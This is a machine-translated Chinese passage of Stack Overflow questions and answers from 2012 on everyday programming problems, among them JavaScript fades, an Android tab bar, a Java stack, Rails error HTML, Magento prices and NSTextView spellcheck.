**编辑：**这是我将如何更改所有代码以使其工作的方法：

```
<script type="text/javascript">
var fired = false;

document.onclick=function(){close_box_fadeOut()};

function close_box(){
    document.getElementById("search-result").style.display="none";
}
function close_box_fadeOut(){
    if(fired){
        return;
    }
    fired = true;
    setOpacity( 100 );
    document.getElementById("search-result").style.display="block";
    fadeOut();
    setTimeout(close_box, 800);
}
function setOpacity( value ) {
 document.getElementById("search-result").style.opacity = value / 10;
 document.getElementById("search-result").style.filter = 'alpha(opacity=' + value * 10 + ')';
}
function fadeOut() {
 for( var i = 0 ; i <= 100 ; i++ ) 
   setTimeout( 'setOpacity(' + (10 - i / 10) + ')' , 8 * i );
}
</script> 
```

**编辑 2：**这是您点击时的样子。

```
document.onclick = function(){
    if(fade){
        return;
    }

    document.getElementById("search-input").onmouseenter = function(){
        show_box_fadeIn()
        delete this.onmouseenter;
    };
}; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T05:18:19.370

你的`close_box_fadeOut()`函数有这条线

```
document.getElementById("search-result").style.display="block"; 
```

这将使元素在再次淡出之前重新出现。

# android - 带有动画的android应用程序的自定义标签栏

> ID：11806107
> 
> 赞同：5
> 
> 时间：2012-08-04T05:14:19.923
> 
> 标签：android, android-layout

我必须为我的 android 应用程序（如图像）制作一个自定义标签栏（iphone 中同一应用程序的标签栏）

![在此处输入图像描述](../Images/241436147c09c02eb409b1da08e8633e.png)

当我从选项卡传递到其他选项卡时，它会制作动画。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T12:27:05.810

[您可以使用TabHost.onSetTabChangedListener()](http://developer.android.com/reference/android/widget/TabHost.html#setOnTabChangedListener%28android.widget.TabHost.OnTabChangeListener%29)方法注册回调，并从那里触发动画。但是，您还应该记住，TabHost 在 Android 中已被弃用，您正在尝试将非常“iOS-ish”的行为移植到 Android，这对您的用户来说可能不是很自然。

# vb.net - vb.net 中的随机数据库字段

> ID：11806111
> 
> 赞同：0
> 
> 时间：2012-08-04T05:14:31.830
> 
> 标签：vb.net

我有一个名为“test_gen”的数据库......并且有“ID”和“问题”字段。

每次单击按钮时，我都想在列表框中随机化我的“问题”字段..请帮助我！

非常感谢-尼尔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T05:33:05.707

说，我们已将您的数据库保存为数组。

```
Dim DB As String() = {"ID1;Question1", "ID2;Question2"} 
```

然后我们可以调用这个函数并定义我们想要 id 还是 question

```
Private Enum GetOption
    Question
    ID
End Enum

Private Function GetQuestion(DB As String(), [option] As GetOption) As String
    Return DB(New Random().[Next](0, DB.Count())).Split(";"C)(If([option].Equals(GetOption.ID), 1, 0))
End Function

Button1.Click += New EventHandler(Function(Sender As Object, e As EventArgs) 
Listbox1.Add(GetQuestion(DB, GetOption.ID))
End Function) 
```

# ios - 如何使用来自 YQL 股票数据的 JSON 请求？

> ID：11806112
> 
> 赞同：0
> 
> 时间：2012-08-04T05:14:31.270
> 
> 标签：ios, json, ios5, yql

我刚刚使用[这个答案](https://stackoverflow.com/questions/10522440/downloading-stock-quotes-to-app)来设置来自雅虎财经的数据请求。如果您查看该帖子，您会看到它返回一个数据字典（在本例中为投标）和键（符号）。只是为了测试它，我使用了这段代码，但它继续崩溃：

```
NSArray *tickerArray = [[NSArray alloc] initWithObjects:@"AAPL", nil];
NSDictionary *quotes = [self fetchQuotesFor:tickerArray];

NSLog(@"%@",[quotes valueForKey:@"AAPL"]); 
```

你能指出我做错了什么吗？我需要获取一个包含我要求的符号数据的字符串。

请注意：我的代码使用的是这篇文章所基于的代码，即[this](http://tech.element77.com/2012/02/fetching-stock-data-from-yahoo-for-ios.html)。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-12T13:41:50.983

您喜欢的代码对从 API 返回的 JSON 数据的形状做出了错误的假设，并且您收到了标准的 KVC 错误。`reason: '[<__NSCFString 0x7685930> valueForUndefinedKey:]: this class is not key value coding-compliant for the key BidRealtime.'`

通过一些调试，我得到了它的工作......

根据您的输入数组并稍微修改链接的函数，您需要像这样访问引用：

```
#define QUOTE_QUERY_PREFIX @"http://query.yahooapis.com/v1/public/yql?q=select%20symbol%2C%20BidRealtime%20from%20yahoo.finance.quotes%20where%20symbol%20in%20("
#define QUOTE_QUERY_SUFFIX @")&format=json&env=store%3A%2F%2Fdatatables.org%2Falltableswithkeys&callback="

+ (NSDictionary *)fetchQuotesFor:(NSArray *)tickers {
  NSMutableDictionary *quotes;

  if (tickers && [tickers count] > 0) {
    NSMutableString *query = [[NSMutableString alloc] init];
    [query appendString:QUOTE_QUERY_PREFIX];

    for (int i = 0; i < [tickers count]; i++) {
      NSString *ticker = [tickers objectAtIndex:i];
      [query appendFormat:@"%%22%@%%22", ticker];
      if (i != [tickers count] - 1) [query appendString:@"%2C"];
    }

    [query appendString:QUOTE_QUERY_SUFFIX];

    NSData *jsonData = [[NSString stringWithContentsOfURL:[NSURL URLWithString:query] encoding:NSUTF8StringEncoding error:nil] dataUsingEncoding:NSUTF8StringEncoding];
    NSDictionary *results = jsonData ? [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:nil] : nil;

    NSDictionary *quoteEntry = [results valueForKeyPath:@"query.results.quote"];
    return quoteEntry;
  }
  return quotes;
} 
```

您会注意到我在此处发布的代码与您链接的函数之间的区别也是`quoteEntry`. 我弄清楚了它对一些断点的作用，特别是在**所有**导致我到达确切行的异常上。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-07T17:48:49.757

您所要做的就是初始化 NSMutableDictionary！

NSMutableDictionary *quotes = [[NSMutableDictionary alloc] init];

顺便说一句，上面的那个人完全没有使用引号字典。直接返回quoteEntry。跳过一步。:)

# iphone - 使用 UIScrollView 以编程方式放大图片的小区域

> ID：11806116
> 
> 赞同：1
> 
> 时间：2012-08-04T05:15:15.243
> 
> 标签：iphone, objective-c, ios

我试图让我的代码以编程方式放大到大图的一小块区域。我稍后会添加点击代码，但现在我只想看看它是否有效。

这段代码中的 zoomToRect 完全没有任何作用，我根本不明白为什么。当我构建它时，图像就位于原点 0,0 处。

我试过使用：

setContentOffset 和 scrollRectToVisible 两者都工作正常 - 图像移动到指定的坐标。但这些都不是我想要的，因为我需要移动和缩放图像，而不仅仅是移动它。

但是 zoomToRect 完全拒绝做任何事情。我现在已经阅读了大约 50 页的示例和教程，但该死的东西没有用。我把头发扯下来不知道为什么。显然，我错过了一些非常基本或重要的观点。

```
UIImage *myFirstImage = [UIImage imageNamed:@"manga_page.jpg"];

UIImageView *myFirstImageView = [[UIImageView alloc] initWithImage:myFirstImage];

[myFirstImageView setFrame:CGRectMake(0, 0, myFirstImage.size.width, myFirstImage.size.height)];

UIScrollView *myFirstScrollView = [[UIScrollView alloc] initWithFrame:CGRectMake(0, 0, self.view.frame.size.width, self.view.frame.size.height)];

[myFirstScrollView setContentSize:CGSizeMake(myFirstImage.size.width, myFirstImage.size.height)];

[myFirstScrollView addSubview:myFirstImageView];

[self.view addSubview:myFirstScrollView];

[myFirstScrollView zoomToRect:CGRectMake(300, 300, 300, 300) animated:YES]; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-11-07T07:57:46.890

问题是我没有定义缩放代表 - 请参见 viewForZoomingInScrollView （页面底部）：

[https://developer.apple.com/library/ios/documentation/uikit/reference/uiscrollviewdelegate_protocol/Reference/UIScrollViewDelegate.html#//apple_ref/occ/intfm/UIScrollViewDelegate/viewForZoomingInScrollView](https://developer.apple.com/library/ios/documentation/uikit/reference/uiscrollviewdelegate_protocol/Reference/UIScrollViewDelegate.html#//apple_ref/occ/intfm/UIScrollViewDelegate/viewForZoomingInScrollView)

当我切换到 Xamarin 框架时，我在 Objective C 中没有代码片段。但是 C# 解决方案如下：

```
scrollView.ViewForZoomingInScrollView = delegate (UIScrollView sv) { return imageView; }; 
```

其中 imageView 是 UIImageView 包含要滚动的图像。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T06:07:03.997

设置 UIScrollView 的 maximumZoomScale 和 minimumZoomScale 属性。

# java - 将数据推送到堆栈

> ID：11806117
> 
> 赞同：0
> 
> 时间：2012-08-04T05:15:22.233
> 
> 标签：java, stack

```
package michael.week.pkg5;

class Employee {
String Fname ;
        String Lname;
        String PhoneNum;
        String Address;
         void setFirst(String First){
             Fname = First ;
         }
         void setlast(String Last){
             Lname  = Last ;
         }
          void setAddress (String address){
             Address = address ;
         }
         void setPhone (String Phone){
             PhoneNum  = Phone ;
         }          
         void display (){
             System.out.println ("the Fist name is :"+ Fname + "  , the last name is :        " + Lname  + "  ,the address is : "+ Address+ "  ,the phone is : "+ PhoneNum);
         }
         }

    package michael.week.pkg5;

     import java.io.BufferedReader;
     import java.io.IOException;
      import java.io.InputStreamReader;

   public class MichaelWeek5 {

/**
 * @param args the command line arguments
 */
public static void main(String[] args) throws IOException {
    class Stck {
    Employee stck [] = new Employee[10];
    int x ;
     void stck (){
        x= -1 ;
    }
    Employee push (Employee item){
        if (x == 9){
            System.out.println ("Stack is full");
        }else stck[++x] = item ;
        return stck[x];
    }
        Employee pop (){
        if (x <0){
            System.out.println (" Stack underflow");
           return stck [x];
        }else 
            return stck[x++];
    }
    }
    InputStreamReader inp = new InputStreamReader(System.in);
    BufferedReader br = new BufferedReader(inp);
    String info2 = null ;
    Stck obj = new Stck();
    Employee obj2 = new Employee ();
    int w = -1 ;
    for (int r=1 ;r>0; ){
   System.out.println("please enter add  to add new employee");
   System.out.println("please enter pop to pop the last added employee");
   System.out.println("please enter exit to exit");
   String choice = br.readLine();
   if(choice.equals("add")){
       System.out.println(w);
       if (w >= 9){
           System.out.println("you reached the maxmum number !");
           continue  ;
       } 
       else {
           w++;
           obj.stck ();
       String info  ;
       System.out.println ("please enter Employee first name :");
       info = br.readLine();

       System.out.println ("please enter Employee last name name :");
       info = br.readLine();

       System.out.println ("please enter Employee address :");
       info = br.readLine();

       System.out.println ("please enter Employee phone number :");
       info = br.readLine();
       }
   } else if(choice.equals("pop")){
           obj.pop();
           w--;
   }else if(choice.equals("exit"))
           break ;
       else {System.out.println (choice + " is wrong choice !") ;
   }
    }

    } 

   } 
```

问候，我是 Java 新手，我正在开发这个程序.......我需要知道如何将数据推送到 stck ？注意：push 的参数是类型employee，Employee 包含First、Last、Phone 和address。我怎样才能推动他们每个人？这是我做的，我的导师拒绝了

```
package week.pkg5;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class Week5 {

/**
 * @param args the command line arguments
 */
public static void main(String[] args) throws IOException {
      class Employee {

     String [] Fname = new String [10];
        String[] Lname= new String [10];
        String[] PhoneNum= new String [10];
        String[] Address = new String [10];
        int x= -1 ;
         void increment(){
           x++;

        }
         void PushFirst(String First){
             Fname[x] = First ;
         }
         void Pushlast(String Last){
             Lname [x] = Last ;
         }
         void PushPhone (String Phone){
             PhoneNum [x] = Phone ;
             System.out.println ("the Fist name is :"+ Fname [x]+ "  , the last name is : " + Lname [x] + "  ,the address is : "+ Address[x] + "  ,the phone is : "+ PhoneNum[x]);
         }
         void PushAddress (String address){
             Address [x] = address ;
         }
         void pop (){
             if (x < 0){
                 System.out.println (" No Empolyee !");
             }
             else {

        System.out.println ("the Fist name is :"+ Fname [x]+ "  , the last name is : " + Lname [x] + "  ,the address is : "+ Address[x] + "  ,the phone is : "+ PhoneNum[x]);
        x--;
        }
}
 void display (){
    if (x < 0){
        System.out.println (" No Empolyee !");
    }
    else {
        for (int q = 0 ; q <=x ; q++){
        System.out.println ((q+1)+"- "+"the First name is :"+ Fname [q]+ "  , the last name is : " + Lname [q] + "  ,the address is : "+ Address[q] + "  ,the phone is : "+ PhoneNum[q]);
        }
    }
}
 }
 InputStreamReader inp = new InputStreamReader(System.in);
    BufferedReader br = new BufferedReader(inp);
    Employee obj = new Employee();
    int w = -1 ;
    for (int r=1 ;r>0; ){
   System.out.println("please enter add  to add new employee");
   System.out.println("please enter display  to display all employees list");
   System.out.println("please enter pop to pop the last added employee");
   System.out.println("please enter exit to exit");
   String choice = br.readLine();

   if(choice.equals("add")){

       System.out.println(w);
       if (w >= 9){
           System.out.println("you reached the maxmum number !");
           continue  ;
       } 
       else {
           w++;
           obj.increment();
       String info  ;
       System.out.println ("please enter Employee first name :");
       info = br.readLine();
       obj.PushFirst(info);
       System.out.println ("please enter Employee last name name :");
       info = br.readLine();
       obj.Pushlast(info);
       System.out.println ("please enter Employee address :");
       info = br.readLine();
       obj.PushAddress(info);
       System.out.println ("please enter Employee phone number :");
       info = br.readLine();
       obj.PushPhone(info);}
   }  else if(choice.equals("display")){
           obj.display();
   } else if(choice.equals("pop")){
           obj.pop();
           w--;
   }else if(choice.equals("exit"))
           break ;
       else {System.out.println (choice + " is wrong choice !") ;
   }
    }

} 
 } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T05:20:00.303

您需要创建一个员工堆栈，然后您可以将整个员工对象推入堆栈。

```
import java.util.Stack;
...
Employee emp = new Employee();
Stack<Employee> stack = new Stack<Employee>();
stack.push(emp); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T05:35:28.370

在为类创建一个对象之后说（这里是stck），它将通过调用如下所示的方法来保存数据

```
class std
{

  int id;
  string name;
  public:
  void set_id(int i)
  {
      id=i;
  }
  void set_name(string n)
  {
      name = n;
   }
  void disp()
  {
     system.out.println("name"+name+" and id = "+id);
  }
 };

  main()
  {
      std s = new std();
      s.set_id(1);
      s.set_name("sunmoon");
      s.disp();
 } 
```

所以在这里你可以观察到 s 被认为是堆栈，我们推送了一个人的详细信息，就像你可以创建对象数组并推送 n 个人员的详细信息一样。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-04T06:59:15.213

您在如何对数据*建模*方面存在几个问题。

**问题#1（最大的问题）**：员工不应该有任何堆栈的内部表示。想想现实世界中的物体。在您的示例中，每个 Employee 应该具有：

*   名字
*   姓
*   地址
*   电话号码

所以成员字段：

```
 String [] Fname = new String [10];
 String[] Lname= new String [10];
 String[] PhoneNum= new String [10];
 String[] Address = new String [10];
 int x= -1 ; 
```

不属于。这导致我们...

**问题 #2**：您为 Stack 建模的方式仅允许固定数量的条目 - 在您的情况下为 10 个）。这不是堆栈的工作方式。如果您不确定，请阅读堆栈是什么。您可以使用[LinkedList](http://docs.oracle.com/javase/6/docs/api/java/util/LinkedList.html)在 Java 中对 Stack 建模- 或使用 Java 提供的内置[Stack](http://docs.oracle.com/javase/1.4.2/docs/api/java/util/Stack.html)。如果您决定创建自己的版本，则需要创建的重要操作是：

*   推
*   流行音乐
*   是空的

我的建议是首先对员工进行建模，然后从 JDK 的内置堆栈中推送和弹出它们，直到您真正了解操作，然后再尝试创建自己的操作。

# ruby-on-rails - 如何将我的自定义错误 html 更改为两次渲染本身？

> ID：11806122
> 
> 赞同：3
> 
> 时间：2012-08-04T05:15:48.903
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, ruby-on-rails-3.1

当我尝试使用 Ajax 创建类别时，我的错误消息出现奇怪的行为。

现在我的错误消息如下所示：

![在此处输入图像描述](../Images/b8b1cbff5faf3b0062a310e3da4616f3.png)

我的 create.js.erb 和 new.js.erb 都有相同的代码，就是这一行：

```
$(".cc-form").html("<%= escape_javascript(render(:partial => 'categories/form', locals: { category: @category })) %>"); 
```

这是我的类别表格：

```
<%= form_for(@category, :remote => true, :html => { :class => "add-form", :id => "cform" }) do |f| %>
<fieldset>
   <p>
      <%= f.label :name, "Category Name *" %>
      <br />
      <%= f.text_field :name %>
   </p>
   <div class="form-actions">
     <%= f.submit "Create" %>
   </div>
</fieldset> 
```

以下是启用自定义错误 HTML 的代码：

```
# application.rb

ActionView::Base.field_error_proc = Proc.new do |html_tag, instance|
   errors = Array(instance.error_message).join(',')
   %(#{html_tag}<span class="validation-error">&nbsp;#{errors}</span>).html_safe
end 
```

然后是 HTML 本身以及错误 HTML：

```
<p>
  <label for="category_name">Category Name *</label><span class="validation-error">&nbsp;can't be blank</span>
  <br>
  <input id="category_name" name="category[name]" size="30" type="text" value=""><span class="validation-error">&nbsp;can't be blank</span>
</p> 
```

我只想要 . 旁边`label`而不是右侧的错误消息`input`。我该怎么做？当我查看它时，格式对我来说很棘手。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T18:02:23.900

我猜你用`field_error_proc`得不好，因为将输入字段包装到具有特殊类的元素中很好。`Field_error_proc`默认情况下标记标签和输入标记，`field_with_error`因为引用的对象（`:name`这意味着`category.name`具有错误数组）是相同的。这不是缺陷，因为在这种情况下，将标签的颜色更改为红色很有好处。`actionpack/lib/action_view/helpers/tags/label.rb`我检查了Rails 代码（

对于您的问题，我现在有两种解决方案：

*   代替

    ```
    <%= f.label :name, "类别名称 *" %>
    ```

    采用

    ```
    <label for="category_name">类别名称 *</label>
    ```

    在你看来。

*   它不太好，但是`f.label`如果您`form .label .validation-error { display: none }`在样式表文件中制作，则可以使用。我知道这只是一种解决方法，但如果`f.label`有必要，那么我不知道更好的解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T12:40:31.397

您在页面中有两个这样的`<span>`标签：

```
<span class="validation-error">&nbsp;can't be blank</span> 
```

编辑：

好的，看起来标签和输入都需要用自定义错误包装。这里有几个链接：

[http://stackoverflow.com/questions/5267998/rails-3-field-with-errors-wrapper-changes-the-page-appearance-how-to-avoid-t](https://gist.github.com/1464315)

[https://gist.github.com/1464315](https://gist.github.com/1464315)

# ios - 在使用 iOS SDK 进行身份验证时，是否可以从我的后端发出 Facebook API 请求？

> ID：11806127
> 
> 赞同：2
> 
> 时间：2012-08-04T05:17:03.907
> 
> 标签：ios, facebook, facebook-graph-api, rest, single-sign-on

我正在开发一个具有 RESTful 后端（使用 django 编写）和多个前端的 Web 服务，其中一个是 iOS。我希望尽可能多地由后端完成以最小化前端的复杂性，但是，由于我正在尝试集成 Facebook 开放图，因此该策略失败了。

我目前正在尝试做的是让用户使用 iOS SDK 向 facebook 进行身份验证，然后将接收到的访问令牌提交到后端，例如，后端可以使用它向用户的时间轴发布操作。但是，当尝试从后端发出请求时，我收到错误消息：`{"error": {"message": "Error validating access token: Session does not match current stored session. This may be because the user changed the password since the time the session was created or Facebook has changed the session for security reasons.", "code": 190, "type": "OAuthException", "error_subcode": 460}}`

据推测，这是因为 Facebook 要么识别出请求不是来自 iOS，要么是来自不同的主机。

有没有办法从 iOS SDK 获取可用于[服务器端身份验证](https://developers.facebook.com/docs/authentication/server-side/)的代码，以便后端本身可以请求访问令牌？

也许我只是从完全错误的角度看待这个问题，应该在每个单独的前端实现图形 API 交互？

编辑：基于 Facebook 自己的资源以及这不是一个常见问题的事实，我是否可以认为这仅仅是违反 Open Graph API 的最佳实践？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T23:26:23.480

解决方案最终变得非常愚蠢。我忘记向 iOS 请求 publish_actions 权限，即使我来自尝试使用此功能的 Web 前端。

# magento - 在 magento 中检查产品价格的附加条件

> ID：11806135
> 
> 赞同：1
> 
> 时间：2012-08-04T05:18:44.313
> 
> 标签：magento

在我的 magento 网站中，我添加了价格为 0.00 的产品数量。

现在产品的价格显示为 0.00 美元。

所以我想显示价格`not mentioned`而不是`$0.00`。

我怎样才能做到这一点？

price.phtml 我需要为此写什么条件？

我的条件是：

```
if price == 0.00 display the text 'not mentioned' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T06:50:33.180

尝试这个。

```
 <?php 
        if ((int)$this->getPrice()){
            echo $this->getPrice();
        }else {
            echo "not mentioned";
        } 
    ?> 
```

如果我错了，请纠正我。

^^

# android - 当我把它放在标签中时，我的文字转语音 android 应用程序停止工作

> ID：11806143
> 
> 赞同：2
> 
> 时间：2012-08-04T05:20:25.437
> 
> 标签：android, tabs, text-to-speech

我有一个文字转语音应用程序，它运行良好。事情是我必须把它放在一个标签中，标签工作正常。但是当我将 tts 放在选项卡中时，它不再起作用了。我已经更改了类名、布局以查看和打包，当然除了变量之外，其他所有内容都不可更改。布局还行。不幸的是，我真的必须把它放在一个标签里。但最糟糕的是它没有显示任何错误。即使尝试捕捉也无法捕捉到任何东西。所以我认为这是一种逻辑错误，它吸收了我脑海中的所有逻辑。哈哈。我检查了调用此活动的主要活动，并显示它们是干净的。所以，这里是代码：

```
package leytocz.add.andriod;

import java.util.Locale;
import android.app.Activity;
import android.os.Bundle;
import android.speech.tts.TextToSpeech;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

public class nptab extends Activity implements TextToSpeech.OnInitListener{

    private TextToSpeech tts;
    private Button btnSpeak;
    private EditText txtText;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.nptab);
        tts=new TextToSpeech(this,this);
        btnSpeak=(Button) findViewById(R.id.btnSpeak);
        txtText=(EditText) findViewById(R.id.txtText);

        btnSpeak.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View arg0) {
                speakOut();
            }
        });
    }
@Override
public void onInit(int status) {
    if (status==TextToSpeech.SUCCESS) {
        int result=tts.setLanguage(Locale.US);
        if (result==TextToSpeech.LANG_MISSING_DATA
                || result==TextToSpeech.LANG_NOT_SUPPORTED) {
            Log.e("TTS","This Language is not supported");
        } else {
            btnSpeak.setEnabled(true);
            speakOut();
        }
    } else {
        Log.e("TTS", "Initialization Failed!");
    }
}
private void speakOut() {
    String text=txtText.getText().toString();
    tts.speak(text,TextToSpeech.QUEUE_FLUSH, null);
}
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T09:36:38.843

正确的。

```
static TextToSpeech mTTS; 
```

创建（）：

```
Intent checkIntent = new Intent();
checkIntent.setAction(TextToSpeech.Engine.ACTION_CHECK_TTS_DATA);
startActivityForResult(checkIntent, MY_DATA_CHECK_CODE); 
```

活动结果：

```
 if (requestCode == MY_DATA_CHECK_CODE && !mTTSInitialized) 
    {
        if (resultCode == TextToSpeech.Engine.CHECK_VOICE_DATA_PASS) 
        {
            // success, create the TTS instance
            mTTS = new TextToSpeech(this, (OnInitListener) this);
            if (mTTS!=null)
                mTTSInitialized = true;
        } 
        else 
        {
            // missing data, install it
            Intent installIntent = new Intent();
            installIntent.setAction(
                TextToSpeech.Engine.ACTION_INSTALL_TTS_DATA);
            startActivity(installIntent);
        }
    } 
```

吸气剂：

```
public static TextToSpeech getmTTS() {
    return mTTS;
} 
```

所有这些都放置在 TabHost 本身中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-10T13:38:47.323

不需要在您的活动中编写这么多代码，只需单独编写这一行，我也遇到了这个问题，最后我得到了这个解决方案。

换这个

```
tts=new TextToSpeech(this,this); --this is your code 
```

你这样变

```
tts=new TextToSpeech(getParent(),this); 
```

它对我来说非常有用

# java - Main类中的Java调用方法

> ID：11806145
> 
> 赞同：0
> 
> 时间：2012-08-04T05:20:39.693
> 
> 标签：java, oop, class

假设我有`Main`类，它有一个 class 实例`A`。

如何在`Main`类中调用类中的方法`A`？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T05:30:04.070

这被称为`Composition`......**其中一个类具有其他类的引用......**

`Composition`当我们需要**一个或几个功能但不是一个类的所有功能**时，它是**首选。** `Inheritance`

 ****例如：**

```
public class A{

 Main m = new M();  // m is a Object Reference Variable of type Main in class A
 m.go();           // go() is a method in class Main

 } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T06:46:23.727

如果方法是静态方法（即用“public static ReturnType methodName()”声明），那么在A类中，你需要调用Main.methodName()。

但是，如果该方法是实例方法（声明为“public ReturnType methodName()”），那么您需要以某种方式将 Main 的实例传递给 A 的实例（可能通过构造函数或 setter 方法）。在 A 类中，您可以调用 instanceOfMain.methodName()。

然而（正如一些人已经提到的）这可能不是处理事情的最佳方式。Main 类应该只是程序开始的地方；它不是你应该做任何真正的程序逻辑的地方。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-04T05:23:25.063

如果是实例方法，那么需要A里面有M的实例，才能调用A里面M的方法。如果是静态方法，直接调用即可。但是你持有循环引用，所以要小心。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-04T05:24:29.040

Main.methodName() 用于静态方法。

尽管在我看来，您尝试做的事情可能是不好的做法。您的 Main 方法或类应该只是一个入口点

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-04T05:26:51.130

要从 calss A 调用 Main 类中的方法，如果两个 calsses 没有像继承这样的关系，则需要类 A 中的 Main 类的实例（考虑它们在同一个包中）。如果是静态的，那么您可以调用 Main.methodName();**

# cocoa - 完全禁用 NSTextView 拼写检查

> ID：11806146
> 
> 赞同：12
> 
> 时间：2012-08-04T05:20:48.483
> 
> 标签：cocoa, nstextview

如何禁用 NSTextView 的拼写检查？特别是自动绘制的红线。我知道 Xcode 中的“连续拼写检查”选项，并且我在与拼写检查相关的文档中找到的每个选项似乎都没有消除红线。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-04T07:47:02.700

选择`NSTextView`（在 IB 中双击它，因为默认情况下或在 Document Outline 中选择它`NSTextView`）*并*转到*Attributes Inspector -> Linguistics -> 并在此处****取消选中连续拼写检查***：`NSScrollView`

 ***![截屏](../Images/5b6ada1d168cd30e75774f4a19c59610.png)

结果：

![在此处输入图像描述](../Images/5a968cb020266f8b69145633255a59c3.png)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-04T05:38:44.923

我不知道你尝试了什么，但`[self.textView setContinuousSpellCheckingEnabled:NO];`对我有用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-02-09T19:45:57.453

取消设置后`continuousSpellCheckingEnabled`清理您的构建文件夹并再次运行。似乎它在构建之间保持设置（非常令人惊讶！）。您观察到更改属性名称解决了这个问题，这让我想到了这个解决方案——在您询问近五年后仍然是一个问题。***

# wpf - Outlook 喜欢自动完成文本框

> ID：11806154
> 
> 赞同：0
> 
> 时间：2012-08-04T05:23:25.230
> 
> 标签：wpf, autocomplete

嗨，我是 WPF 的新手，我正在尝试开发一个与 Outlook 中的“发送到”文本框相同的文本框功能。目前我已经参考了这些帖子[post1](http://www.codeproject.com/Articles/44920/A-Reusable-WPF-Autocomplete-TextBox)和[post2](http://blog.pixelingene.com/2010/10/tokenizing-control-convert-text-to-tokens/)。我无法将所有这些组合在一起。有没有人解决这个问题？或者请向我展示 WPF 中自动完成文本框的一些示例实现。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-03T00:22:01.580

另一个自动完成文本框的好例子可以在 [http://kiwiingenuity.net.nz/post/A-WPF-Text-Box-Autocomplete-Extender-Using-Reactive-Extensions找到](http://kiwiingenuity.net.nz/post/A-WPF-Text-Box-Autocomplete-Extender-Using-Reactive-Extensions)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-16T09:13:42.277

[http://blog.pixelingene.com/2010/10/tokenizing-control-convert-text-to-tokens/](http://blog.pixelingene.com/2010/10/tokenizing-control-convert-text-to-tokens/) - 看看这个

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-04T11:37:58.543

你试过这个.. [自动完成文本框](http://www.codeproject.com/Articles/44920/A-Reusable-WPF-Autocomplete-TextBox)

# javascript - 标题字段中上传文件的名称

> ID：11806155
> 
> 赞同：0
> 
> 时间：2012-08-04T05:24:04.720
> 
> 标签：javascript

我在 youtube 上看到，当我们自动上传任何视频时，表单的标题字段会填满视频文件的名称。我怎样才能做到这一点？

我的表格是

```
<form enctype="multipart/form-data" method="post" action="http://youshare.ca/music/writestorypost"><p>
    <span class="form_label">Title</span><input type="text" value="" name="title" style="width:400px" class="inputText required"></p>
    <p><label>Upload</label><input type="file" name="song">
    <p><input type="submit" value="Submit" class="button"></p><input type="hidden" value="935" name="page_id">
</form> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T05:35:47.763

这是一些使其工作的jquery代码：

```
$('#myfile').change( function(){
    var fileValue = $(this).val();
    $('#mytitle').val(fileValue);
}); 
```

这是修改后的 HTML：

```
<form enctype="multipart/form-data" method="post" action="http://youshare.ca/music/writestorypost"><p>
    <span class="form_label">Title</span><input id="mytitle" type="text" value="" name="title" style="width:400px" class="inputText required"></p>
    <p><label>Upload</label><input id="myfile" type="file" name="song">
    <p><input type="submit" value="Submit" class="button"></p><input type="hidden" value="935" name="page_id">
</form> 
```

[单击此处](http://jsfiddle.net/fddXt/)查看有效的 JSFiddle。如果您以前从未使用过 jQuery，请告诉我，因为这可能会造成混淆！

**编辑：**这是替换代码：

```
$('#myfile').change( function(){
    var fileValue = $(this).val();
    fileValue = fileValue.replace('_', ' ');
    fileValue = fileValue.replace('-', ' ');
    $('#mytitle').val(fileValue);
}); 
```

[这是更新的jsfiddle](http://jsfiddle.net/fddXt/2/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T05:38:10.383

使用此代码：

```
//use this in your form tag
<input id="song" type="file" />
//use this in your destination(action)
document.title = document.getElementById("song").value ; 
```

# java - 如何检查文件是否存在？

> ID：11806160
> 
> 赞同：0
> 
> 时间：2012-08-04T05:24:55.000
> 
> 标签：java, file, filesystems

我正在尝试将内容保存在文件中，但首先我想搜索任一文件是否存在。但是我写的代码，每次都返回true。

```
String fileName=FNameTextField.getText();

File file=new File(fileName);

if(file.exists()&& !file.isDirectory()) {
    // It returns true if File or directory does exist
    System.out.println("the file or directory  you are searching does  exist : " );

}else{
    // It returns true if File or directory not exists
    System.out.println("the file or directory you are searching does not  exist : " );
} 
```

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T05:49:27.100

你的逻辑似乎很古怪，或者至少我无法理解它
